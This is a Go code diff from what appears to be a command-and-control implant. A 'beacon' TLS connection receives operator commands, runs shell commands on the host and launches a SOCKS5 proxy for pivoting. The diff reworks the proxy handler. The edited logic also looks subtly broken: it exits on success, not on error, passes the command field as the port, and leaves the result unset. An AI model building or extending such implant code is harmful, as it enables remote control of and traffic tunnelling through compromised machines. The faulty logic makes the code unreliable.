@@ -178,7 +178,11 @@ func handleCommandRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.D
 				if commandResponse.CommandType == "shell" {
 					commandResult = executeAndReportCommand(beacon, encoder, commandResponse)
 				} else if commandResponse.CommandType == "socks" {
-					commandResult = startSocks5Proxy(commandResponse)
+					_, err := startSocks5Proxy(beacon, encoder, commandResponse)
+					if err == nil {
+						goto Exit
+					}
+					logger.Logf(logger.Done, "Started SOCKS5 proxy")
 				}
 
 				if commandResult.CommandResult == "2" {
@@ -207,7 +211,8 @@ Exit:
 	return nil
 }
 
-func startSocks5Proxy(port int) (*ProxyServer, error) {
+func startSocks5Proxy(beacon *tls.Conn, encoder *gob.Encoder, commandResponse types.CommandResponse) (*ProxyServer, error) {
+	port := commandResponse.Command
 	conf := &socks5.Config{}
 	server, err := socks5.New(conf)
 	if err != nil {
